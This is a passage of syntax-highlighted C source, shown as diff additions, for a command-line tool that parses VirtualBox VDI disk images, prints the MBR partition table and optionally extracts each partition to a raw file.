+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>vdi <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/sprintf.html"><span style="color: #000066;">sprintf</span></a><span style="color: black;">&#40;</span>ex_name<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;partition_%d____%d_%d.raw&quot;</span><span style="color: #339933;">,</span>part_num<span style="color: #339933;">,</span>start_sect<span style="color: #339933;">,</span>size_sect<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>part <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>ex_name<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;a+&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>vdi<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>ex_name<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>vdi<span style="color: #339933;">,</span>offdata<span style="color: #339933;">,</span>SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>vdi<span style="color: #339933;">,</span>start_sect<span style="color: #339933;">*</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span>SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Extracting...<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span><span style="color: black;">&#40;</span>size <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>buf<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>vdi<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>buf<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>part<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size <span style="color: #339933;">-=</span> <span style="color: #0000dd;">512</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>vdi<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>part<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Extraction done to %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>ex_name<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #993333;">void</span> DumpVDIPartitionTable<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>f<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> extract<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE <span style="color: #339933;">*</span>fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; VDIPREHEADER pre<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; VDIHEADER1 h1<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; MBR mbr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> offdata <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span>p_cnt<span style="color: #339933;">,</span>sect_after_mbr<span style="color: #339933;">,</span>sect_in_partition<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>fp <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>pre<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>VDIPREHEADER<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>VDI_GET_VERSION_MAJOR<span style="color: black;">&#40;</span>pre.<span style="color: #202020;">u32Version</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span> <span style="color: #339933;">&amp;&amp;</span> VDI_GET_VERSION_MINOR<span style="color: black;">&#40;</span>pre.<span style="color: #202020;">u32Version</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>h1.<span style="color: #202020;">u32Type</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%s is not a fixed size disk<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>h1<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>VDIHEADER1<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>h1.<span style="color: #202020;">offData</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Offdata (%s) -&gt; %d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: #339933;">,</span>h1.<span style="color: #202020;">offData</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/rewind.html"><span style="color: #000066;">rewind</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span>h1.<span style="color: #202020;">offData</span><span style="color: #339933;">,</span>SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>mbr<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>MBR<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;MBR signature -&gt; 0x%x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>mbr.<span style="color: #202020;">signature</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>p_cnt <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>p_cnt <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>p_cnt<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sect_after_mbr<span style="color: #339933;">,</span>mbr.<span style="color: #202020;">partitions</span><span style="color: black;">&#91;</span>p_cnt<span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #0000dd;">8</span><span style="color: #339933;">,</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sect_in_partition<span style="color: #339933;">,</span>mbr.<span style="color: #202020;">partitions</span><span style="color: black;">&#91;</span>p_cnt<span style="color: black;">&#93;</span><span style="color: #339933;">+</span><span style="color: #0000dd;">12</span><span style="color: #339933;">,</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Partition #%d -&gt; status: %10s - type: 0x%.2x - partition begins at sector: %9d - sectors in partition: %9d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>p_cnt<span style="color: #339933;">,</span><span style="color: black;">&#40;</span>mbr.<span style="color: #202020;">partitions</span><span style="color: black;">&#91;</span>p_cnt<span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #208080;">0x80</span><span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">&quot;bootable&quot;</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">&quot;not active&quot;</span><span style="color: #339933;">,</span>mbr.<span style="color: #202020;">partitions</span><span style="color: black;">&#91;</span>p_cnt<span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>sect_after_mbr<span style="color: #339933;">,</span>sect_in_partition<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>extract<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ExtractPartition<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span>h1.<span style="color: #202020;">offData</span><span style="color: #339933;">,</span>p_cnt<span style="color: #339933;">,</span>sect_after_mbr<span style="color: #339933;">,</span>sect_in_partition<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;header and offdata unknown in %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Header not supported in %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>argv<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> a_cnt<span style="color: #339933;">,</span>extract<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>argc <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Dump partitions table from VDI (virtual disk) files by WarGame/DoomRiderz<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Usage: [-d | -e] &lt;vdi file 1&gt; &lt;vdi file 2&gt; ... &lt;vdi file n&gt; <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
